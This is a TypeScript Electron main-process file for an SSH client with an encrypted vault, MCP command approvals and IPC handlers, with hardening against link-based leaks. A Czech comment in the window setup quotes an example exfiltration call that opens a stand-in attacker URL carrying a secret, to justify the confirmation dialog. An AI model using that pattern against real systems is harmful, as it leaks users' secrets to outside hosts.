// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Simplixio — Stanislav Opletal <info@simplixio.net>

import {
  app,
  BrowserWindow,
  clipboard,
  dialog,
  ipcMain,
  session as electronSession,
  shell
} from 'electron'
import fsp from 'node:fs/promises'
import path from 'node:path'
import { CH } from '../shared/channels'
import { contentSecurityPolicy } from '../shared/csp'
import type {
  ConnectionInput,
  ConnectionMeta,
  KnownHost,
  Result,
  Settings,
  Snippet,
  SnippetInput,
  VaultStatus
} from '../shared/types'
import type { CommandApproval, McpStatus, ShareRequest } from '../shared/types'
import { appError, currentLocale, initI18n, setLocale, t } from './i18n'
import { readPrefs, writePrefs } from './prefs'
import { migrateLegacyProfile, newId, vault } from './vault'
import { DEFAULT_SETTINGS, sanitizeSettings } from './settings'
import { ssh } from './ssh'
import { mcp } from './mcp'
import { approvals } from './approvals'
import { readSmallTextFile } from './textFile'

const isDev = !app.isPackaged
let mainWindow: BrowserWindow | null = null
let autoLockTimer: NodeJS.Timeout | null = null

/* ------------------------------------------------------------------ okno */

function createWindow(): void {
  mainWindow = new BrowserWindow({
    width: 1360,
    height: 860,
    minWidth: 900,
    minHeight: 600,
    show: false,
    backgroundColor: '#0e1116',
    title: 'ConsoleWard',
    autoHideMenuBar: true,
    webPreferences: {
      preload: path.join(__dirname, '../preload/index.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: true,
      spellcheck: false
    }
  })

  mainWindow.once('ready-to-show', () => mainWindow?.show())

  // Externí odkazy do systémového prohlížeče, nikdy do okna aplikace.
  //
  // Schéma se kontroluje kotveným výrazem, takže `file:`, `javascript:` ani SMB
  // cesty neprojdou. To ale nestačí: `shell.openExternal` neřídí CSP, takže
  // `window.open('https://utocnik/?d=' + tajemstvi)` byl použitelný jako
  // exfiltrační kanál — a odkazy v terminálovém výstupu jsou klikatelné, takže
  // ten výstup nemusí pocházet od uživatele.
  //
  // Proto se uživatel zeptá. Dialog ukazuje **celou** adresu, ne zkrácenou:
  // zkrácení je přesně to, čím se exfiltrační URL schová.
  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    if (!/^https?:\/\//.test(url)) return { action: 'deny' }

    const win = mainWindow
    if (!win) return { action: 'deny' }

    void dialog
      .showMessageBox(win, {
        type: 'question',
        buttons: [t('common.cancel'), t('link.open')],
        defaultId: 0,
        cancelId: 0,
        title: t('link.confirmTitle'),
        message: t('link.confirmBody'),
        detail: url,
        noLink: true
      })
      .then(({ response }) => {
        if (response === 1) void shell.openExternal(url)
      })

    return { action: 'deny' }
  })
  mainWindow.webContents.on('will-navigate', (event, url) => {
    const devUrl = process.env['ELECTRON_RENDERER_URL']
    if (devUrl && url.startsWith(devUrl)) return
    event.preventDefault()
  })

  mainWindow.on('closed', () => {
    mainWindow = null
  })

  const devUrl = process.env['ELECTRON_RENDERER_URL']
  if (isDev && devUrl) {
    void mainWindow.loadURL(devUrl)
  } else {
    void mainWindow.loadFile(path.join(__dirname, '../renderer/index.html'))
  }
}

function applyCsp(): void {
  // Same policy the meta tag carries, from the same source. Both apply and CSP
  // intersects them, so they must agree; see src/shared/csp.ts for why there
  // used to be two and why the strict one never reached users.
  const policy = contentSecurityPolicy(isDev)

  electronSession.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': [policy]
      }
    })
  })

  // Aplikace nepotřebuje kameru, mikrofon ani nic podobného.
  //
  // Both handlers, because Electron asks through two different doors. The
  // request handler covers the asynchronous permission prompts; the check
  // handler covers the SYNCHRONOUS path, which several permissions take
  // instead — and an unset check handler defaults to allowing them. Setting
  // only one of the two leaves the other wide open, which is what this was.
  electronSession.defaultSession.setPermissionRequestHandler((_wc, _perm, cb) => cb(false))
  electronSession.defaultSession.setPermissionCheckHandler(() => false)
}

/* ------------------------------------------------------- automatické zamčení */

function resetAutoLock(): void {
  if (autoLockTimer) clearTimeout(autoLockTimer)
  autoLockTimer = null
  if (!vault.isUnlocked()) return

  const minutes = vault.read().settings.autoLockMinutes
  if (!minutes || minutes <= 0) return

  autoLockTimer = setTimeout(() => doLock(), minutes * 60_000)
}

function doLock(): void {
  if (!vault.isUnlocked()) return
  const disconnect = vault.read().settings.disconnectOnLock
  if (disconnect) ssh.disconnectAll()
  // Zamčený trezor nemá co nabízet – MCP server hned zavíráme.
  void mcp.stopOnLock().then(pushMcpStatus)
  approvals.rejectAll()
  vault.lock()
  if (autoLockTimer) clearTimeout(autoLockTimer)
  autoLockTimer = null
  mainWindow?.webContents.send(CH.vaultLockedEvent)
}

/* ------------------------------------------------- schvalovací fronta MCP */

function pushMcpStatus(): void {
  mainWindow?.webContents.send(CH.mcpStatusEvent, mcp.status())
}

/** Po odemčení trezoru nastartuje MCP server, pokud je zapnutý v nastavení. */
async function syncMcp(): Promise<void> {
  if (!vault.isUnlocked()) return
  const wanted = Boolean(vault.read().settings.mcpEnabled)
  try {
    if (wanted) await mcp.start()
    else await mcp.stop()
  } catch (err) {
    console.error('MCP server:', err)
  } finally {
    pushMcpStatus()
  }
}

function registerMcpBridge(): void {
  approvals.bind({
    sendCommand: (req: CommandApproval) =>
      mainWindow?.webContents.send(CH.mcpCommandRequestEvent, req),

    sendShare: (req: ShareRequest) => mainWindow?.webContents.send(CH.mcpShareRequestEvent, req),

    // Raising is the queue's call, not the tool's: a raise per request is
    // flashFrame in a loop on Windows, and only the queue can tell whether a
    // dialog is already up.
    raiseWindow: () => {
      if (!mainWindow) return
      if (mainWindow.isMinimized()) mainWindow.restore()
      mainWindow.show()
      mainWindow.focus()
      if (process.platform === 'win32') mainWindow.flashFrame(true)
    }
  })

  mcp.bind(approvals)
}

/* ----------------------------------------------------------------- pomůcky */

function ok<T>(value: T): Result<T> {
  return { ok: true, value }
}

/**
 * The error the renderer is allowed to see.
 *
 * An `AppError` was raised by this application deliberately: its message is a
 * translated sentence written for the person reading it, so it goes through
 * whole. Anything else came from node, from Electron or from a library, and
 * those messages carry absolute paths (`ENOENT: … C:\Users\stan\AppData\…`),
 * internal state and sometimes a fragment of the input that caused them. The
 * renderer displays what it is given, so that lands in front of the user, in a
 * window whose content is not something we want to be quotable in a screenshot
 * or a bug report.
 *
 * The raw error still reaches the console, where the developer wants it and
 * where it is not part of the UI.
 */
function fail(err: unknown): Result<never> {
  const key = (err as { key?: unknown } | null | undefined)?.key
  if (typeof key === 'string' && err instanceof Error) {
    return { ok: false, error: err.message }
  }
  console.error('ipc:', err)
  return { ok: false, error: t('error.unexpected') }
}

/** Registrace handleru s jednotným zabalením chyb do `Result`. */
function handle<T>(channel: string, fn: (...args: any[]) => Promise<T> | T): void {
  ipcMain.handle(channel, async (_event, ...args) => {
    try {
      return ok(await fn(...args))
    } catch (err) {
      return fail(err)
    }
  })
}

function toMeta(c: {
  id: string
  name: string
  host: string
  port: number
  username: string
  authKind: ConnectionMeta['authKind']
  password?: string
  privateKey?: string
  passphrase?: string
  agentSocket?: string
  folder?: string
  notes?: string
  createdAt: number
  updatedAt: number
}): ConnectionMeta {
  return {
    id: c.id,
    name: c.name,
    host: c.host,
    port: c.port,
    username: c.username,
    authKind: c.authKind,
    hasPassword: Boolean(c.password),
    hasPrivateKey: Boolean(c.privateKey),
    hasPassphrase: Boolean(c.passphrase),
    agentSocket: c.agentSocket,
    folder: c.folder,
    notes: c.notes,
    createdAt: c.createdAt,
    updatedAt: c.updatedAt
  }
}

/**
 * Aplikuje hodnotu tajemství podle sémantiky ConnectionInput:
 * undefined = beze změny, '' = smazat, jinak nastavit.
 */
function applySecret(current: string | undefined, incoming: string | undefined): string | undefined {
  if (incoming === undefined) return current
  if (incoming === '') return undefined
  return incoming
}

function validateInput(input: ConnectionInput): void {
  if (!input.name?.trim()) throw appError('error.fillName')
  if (!input.host?.trim()) throw appError('error.fillHost')
  if (!input.username?.trim()) throw appError('error.fillUsername')
  const port = Number(input.port)
  if (!Number.isInteger(port) || port < 1 || port > 65535) {
    throw appError('error.invalidPort')
  }
  if (!['password', 'key', 'agent'].includes(input.authKind)) {
    throw appError('error.invalidAuth')
  }
}

/* --------------------------------------------------------------------- IPC */

function registerIpc(): void {
  /* trezor */
  handle(CH.vaultStatus, async (): Promise<VaultStatus> => ({
    exists: vault.exists(),
    unlocked: vault.isUnlocked(),
    hasRecovery: vault.isUnlocked() ? vault.hasRecoveryKey() : await vault.hasRecoveryOnDisk(),
    path: vault.filePath
  }))

  handle(CH.vaultCreate, async (pw: string) => {
    const recoveryKey = await vault.create(pw)
    resetAutoLock()
    return recoveryKey
  })

  handle(CH.vaultUnlock, async (pw: string) => {
    await vault.unlock(pw)
    resetAutoLock()
    await syncMcp()
    return null
  })

  // Vrací nový obnovovací klíč — obnova rotuje datový klíč, takže ten použitý
  // přestal platit. UI ho musí zobrazit, jinak uživatel zůstane bez záchrany.
  handle(CH.vaultUnlockWithRecovery, async (recoveryKey: string, newPassword: string) => {
    const fresh = await vault.unlockWithRecovery(recoveryKey, newPassword)
    resetAutoLock()
    await syncMcp()
    return fresh
  })

  handle(CH.vaultLock, () => {
    doLock()
    return null
  })

  // Vrací nový obnovovací klíč, pokud trezor nějaký měl. Změna hesla rotuje
  // datový klíč a starý obnovovací wrap pod nový DEK postavit nejde — klíč se
  // nikde neukládá. UI ho musí zobrazit.
  handle(CH.vaultChangePassword, (oldPw: string, newPw: string) =>
    vault.changePassword(oldPw, newPw)
  )

  // Heslo je povinné: rotace DEK ho potřebuje, a bez něj stačila odemčená
  // relace na vydání klíče, který trezor otevírá navždy.
  handle(CH.vaultRegenerateRecovery, (password: string) =>
    vault.regenerateRecoveryKey(password)
  )

  handle(CH.vaultRemoveRecovery, async (password: string) => {
    await vault.removeRecoveryKey(password)
    return null
  })

  /* připojení */
  handle(CH.connList, (): ConnectionMeta[] =>
    vault
      .read()
      .connections.map(toMeta)
      .sort(byName)
  )

  handle(CH.connSave, async (input: ConnectionInput): Promise<ConnectionMeta> => {
    validateInput(input)
    return vault.mutate((data) => {
      const now = Date.now()
      const existing = input.id ? data.connections.find((c) => c.id === input.id) : undefined

      if (existing) {
        existing.name = input.name.trim()
        existing.host = input.host.trim()
        existing.port = Number(input.port)
        existing.username = input.username.trim()
        existing.authKind = input.authKind
        existing.password = applySecret(existing.password, input.password)
        existing.privateKey = applySecret(existing.privateKey, input.privateKey)
        existing.passphrase = applySecret(existing.passphrase, input.passphrase)
        existing.agentSocket = input.agentSocket?.trim() || undefined
        existing.folder = input.folder?.trim() || undefined
        existing.notes = input.notes ?? undefined
        existing.updatedAt = now
        return toMeta(existing)
      }

      const created = {
        id: newId(),
        name: input.name.trim(),
        host: input.host.trim(),
        port: Number(input.port),
        username: input.username.trim(),
        authKind: input.authKind,
        password: input.password || undefined,
        privateKey: input.privateKey || undefined,
        passphrase: input.passphrase || undefined,
        agentSocket: input.agentSocket?.trim() || undefined,
        folder: input.folder?.trim() || undefined,
        notes: input.notes ?? undefined,
        createdAt: now,
        updatedAt: now
      }
      data.connections.push(created)
      return toMeta(created)
    })
  })

  handle(CH.connRemove, async (id: string) => {
    await vault.mutate((data) => {
      const idx = data.connections.findIndex((c) => c.id === id)
      if (idx < 0) throw appError('error.connNotFound')
      data.connections.splice(idx, 1)
    })
    return null
  })

  handle(CH.connDuplicate, async (id: string): Promise<ConnectionMeta> =>
    vault.mutate((data) => {
      const src = data.connections.find((c) => c.id === id)
      if (!src) throw appError('error.connNotFound')
      const now = Date.now()
      const copy = { ...src, id: newId(), name: `${src.name} (kopie)`, createdAt: now, updatedAt: now }
      data.connections.push(copy)
      return toMeta(copy)
    })
  )

  /* příkazy a poznámky */
  handle(CH.snipList, (): Snippet[] =>
    [...vault.read().snippets].sort((a, b) => collator().compare(a.title, b.title))
  )

  handle(CH.snipSave, async (input: SnippetInput): Promise<Snippet> => {
    if (!input.title?.trim()) throw appError('error.fillName')
    if (!input.body?.trim()) throw appError('error.fillBody')
    if (!['command', 'note'].includes(input.kind)) throw appError('error.invalidKind')

    // Konce řádků sjednotíme na LF – CRLF by se v shellu projevilo jako ^M.
    const body = normalizeNewlines(input.body)

    return vault.mutate((data) => {
      const now = Date.now()
      const existing = input.id ? data.snippets.find((s) => s.id === input.id) : undefined

      if (existing) {
        existing.title = input.title.trim()
        existing.body = body
        existing.note = input.note?.trim() || undefined
        existing.folder = input.folder?.trim() || undefined
        existing.kind = input.kind
        existing.updatedAt = now
        return existing
      }

      const created: Snippet = {
        id: newId(),
        title: input.title.trim(),
        body,
        note: input.note?.trim() || undefined,
        folder: input.folder?.trim() || undefined,
        kind: input.kind,
        createdAt: now,
        updatedAt: now
      }
      data.snippets.push(created)
      return created
    })
  })

  handle(CH.snipRemove, async (id: string) => {
    await vault.mutate((data) => {
      const idx = data.snippets.findIndex((s) => s.id === id)
      if (idx < 0) throw appError('error.snipNotFound')
      data.snippets.splice(idx, 1)
    })
    return null
  })

  handle(CH.snipDuplicate, (id: string): Promise<Snippet> =>
    vault.mutate((data) => {
      const src = data.snippets.find((s) => s.id === id)
      if (!src) throw appError('error.snipNotFound')
      const now = Date.now()
      const copy: Snippet = {
        ...src,
        id: newId(),
        title: `${src.title} (kopie)`,
        createdAt: now,
        updatedAt: now
      }
      data.snippets.push(copy)
      return copy
    })
  )

  /* nastavení */
  handle(CH.settingsGet, (): Settings => {
    const d = vault.read()
    return { ...DEFAULT_SETTINGS, ...d.settings, hasAiApiKey: Boolean(d.aiApiKey) }
  })

  handle(CH.settingsSave, async (patch: Partial<Settings>): Promise<Settings> => {
    const saved = await vault.mutate((data) => {
      // Throws before anything is assigned, so a refused patch writes nothing.
      data.settings = sanitizeSettings(data.settings, patch)
      return data.settings
    })
    resetAutoLock()
    return { ...saved, hasAiApiKey: Boolean(vault.read().aiApiKey) }
  })

  /* známé hostitele */
  handle(CH.hostsList, (): KnownHost[] =>
    // Not a collator: a host key is base64, an opaque identifier nobody reads
    // as a word. Locale-aware collation would reorder it by rules that mean
    // nothing here and differ between users; a code-unit sort is stable
    // everywhere, which is the only property this list needs.
    [...vault.read().knownHosts].sort((a, b) => (a.hostKey < b.hostKey ? -1 : 1))
  )

  handle(CH.hostsForget, async (hostKey: string) => {
    await vault.mutate((data) => {
      data.knownHosts = data.knownHosts.filter((h) => h.hostKey !== hostKey)
    })
    return null
  })

  /* SSH */
  //
  // Každá cesta k SSH I/O prochází `requireUnlocked()`. Zamčení trezoru dřív
  // nebylo hranicí: renderer sice smazal seznam záložek, ale hlavní proces
  // relace držel dál a `write`/`resize` nikdo nehlídal — takže zamčená
  // aplikace pořád uměla psát do vzdáleného shellu. Zámek buď znamená konec
  // přístupu, nebo neznamená nic.
  handle(CH.sshConnect, (connectionId: string) => {
    vault.requireUnlockedPublic()
    return ssh.connect(connectionId)
  })
  handle(CH.sshWrite, (sessionId: string, data: string) => {
    vault.requireUnlockedPublic()
    ssh.write(sessionId, data)
    return null
  })
  handle(CH.sshResize, (sessionId: string, cols: number, rows: number) => {
    vault.requireUnlockedPublic()
    ssh.resize(sessionId, cols, rows)
    return null
  })
  handle(CH.sshDisconnect, (sessionId: string) => {
    ssh.disconnect(sessionId)
    return null
  })
  handle(CH.sshAnswerHostKey, (requestId: string, accept: boolean) => {
    ssh.answerHostKey(requestId, Boolean(accept))
    return null
  })

  /* dialogy */
  handle(CH.dialogReadTextFile, async (title: string) => {
    if (!mainWindow) return null
    const res = await dialog.showOpenDialog(mainWindow, {
      title: title || 'Vybrat soubor',
      properties: ['openFile'],
      filters: [
        { name: 'Privátní klíče', extensions: ['pem', 'key', 'ppk', 'rsa', 'ed25519', 'pub', ''] },
        { name: 'Všechny soubory', extensions: ['*'] }
      ]
    })
    if (res.canceled || res.filePaths.length === 0) return null
    // The picker can hand back a FIFO or a named pipe, and both lie to `stat`.
    return readSmallTextFile(res.filePaths[0])
  })

  handle(CH.dialogSaveTextFile, async (suggestedName: string, content: string) => {
    if (!mainWindow) return null
    const res = await dialog.showSaveDialog(mainWindow, {
      title: 'Uložit soubor',
      defaultPath: suggestedName,
      filters: [{ name: 'Textový soubor', extensions: ['txt'] }]
    })
    if (res.canceled || !res.filePath) return null
    await fsp.writeFile(res.filePath, String(content ?? ''), { encoding: 'utf8', mode: 0o600 })
    return res.filePath
  })

  /* MCP */
  handle(CH.mcpStatus, (): McpStatus => mcp.status())

  handle(CH.mcpSetEnabled, async (enabled: boolean): Promise<McpStatus> => {
    await vault.mutate((data) => {
      data.settings = { ...data.settings, mcpEnabled: Boolean(enabled) }
    })
    if (enabled) await mcp.start()
    else await mcp.stop()
    const status = mcp.status()
    pushMcpStatus()
    return status
  })

  handle(CH.mcpSetPort, async (port: number): Promise<McpStatus> => {
    const n = Number(port)
    if (!Number.isInteger(n) || n < 1024 || n > 65535) {
      throw appError('error.invalidMcpPort')
    }
    await vault.mutate((data) => {
      data.settings = { ...data.settings, mcpPort: n }
    })
    if (mcp.status().running) await mcp.restart()
    const status = mcp.status()
    pushMcpStatus()
    return status
  })

  handle(CH.mcpToken, () => mcp.readToken())
  handle(CH.mcpRegenerateToken, () => mcp.regenerateToken())

  handle(CH.mcpAnswerCommand, (id: string, approved: boolean, autoShare: boolean) => {
    approvals.answerCommand(id, approved, autoShare)
    return null
  })

  handle(CH.mcpAnswerShare, (id: string, shared: boolean, text: string) => {
    approvals.answerShare(id, shared, text)
    return null
  })

  /* schránka (sandboxovaný preload k ní nemá přímý přístup) */
  handle(CH.clipboardRead, () => clipboard.readText())
  handle(CH.clipboardWrite, (text: string) => {
    clipboard.writeText(String(text ?? ''))
    return null
  })

  /* aplikace */
  ipcMain.on(CH.appActivity, () => resetAutoLock())
  handle(CH.appVersion, () => app.getVersion())

  handle(CH.appGetLocale, () => currentLocale())
  handle(CH.appSetLocale, async (locale: string) => {
    const saved = await writePrefs({ locale })
    await setLocale(saved.locale)
    return saved.locale
  })
}

/**
 * Sorts the way the user's own language does.
 *
 * Was `localeCompare(x, 'cs')` on two lists and a bare `localeCompare` on a
 * third — so a German user got Czech collation for their connections and
 * whatever the OS felt like for their known hosts. Neither matched the language
 * they had chosen in the app.
 *
 * Built per call rather than cached: the locale changes while the app runs, and
 * a collator captured at module load would keep sorting by the old one. These
 * lists are short and rebuilt on demand, so the cost does not matter.
 */
function collator(): Intl.Collator {
  return new Intl.Collator(currentLocale(), { sensitivity: 'base', numeric: true })
}

function byName(a: { name: string }, b: { name: string }): number {
  return collator().compare(a.name, b.name)
}

function normalizeNewlines(text: string): string {
  return String(text ?? '').replace(/\r\n?/g, '\n')
}

/* ------------------------------------------------------------------ start */

const gotLock = app.requestSingleInstanceLock()
if (!gotLock) {
  app.quit()
} else {
  app.on('second-instance', () => {
    if (mainWindow) {
      if (mainWindow.isMinimized()) mainWindow.restore()
      mainWindow.focus()
    }
  })

  void app.whenReady().then(async () => {
    // Projekt se dřív jmenoval jinak; přeneseme trezor ze staré složky profilu.
    const migratedFrom = await migrateLegacyProfile(['PuttyUI', 'putty-ui']).catch(() => null)
    if (migratedFrom) console.log('Trezor přenesen ze složky:', migratedFrom)

    await initI18n()

    applyCsp()
    registerIpc()

    ssh.bind({
      data: (sessionId, base64) =>
        mainWindow?.webContents.send(CH.sshDataEvent, sessionId, base64),
      status: (info) => mainWindow?.webContents.send(CH.sshStatusEvent, info),
      hostKeyPrompt: (prompt) => mainWindow?.webContents.send(CH.sshHostKeyEvent, prompt)
    })
    registerMcpBridge()

    createWindow()

    app.on('activate', () => {
      if (BrowserWindow.getAllWindows().length === 0) createWindow()
    })
  })

  app.on('window-all-closed', () => {
    ssh.disconnectAll()
    if (process.platform !== 'darwin') app.quit()
  })

  app.on('before-quit', () => {
    approvals.rejectAll()
    void mcp.stop()
    ssh.disconnectAll()
    vault.lock()
  })
}
